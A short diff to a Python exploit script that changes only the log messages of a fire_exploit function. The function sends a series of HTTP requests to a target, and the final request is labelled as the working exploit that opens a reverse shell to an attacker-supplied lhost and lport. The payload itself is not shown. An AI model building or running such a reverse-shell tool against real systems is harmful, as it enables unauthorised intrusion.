@@ -89,9 +89,9 @@ def fire_exploit(target_url, lhost, lport, attempt_delay=0):
     last = len(attempts) - 1
     for i, (method, path, body, note) in enumerate(attempts):
         if i == last:
-            log(f"[*] Sending exploit to {host}:{port}{path}")
+            log(f"$ {method} http://{host}:{port}{path}  (working exploit → shell on {lhost}:{lport})")
         else:
-            log(f"[*] Trying {method} {path} ({note})")
+            log(f"$ {method} http://{host}:{port}{path}  ({note})")
         _send_request(host, port, _build_request(method, host, path, body))
         if attempt_delay and i != last:
             time.sleep(attempt_delay)
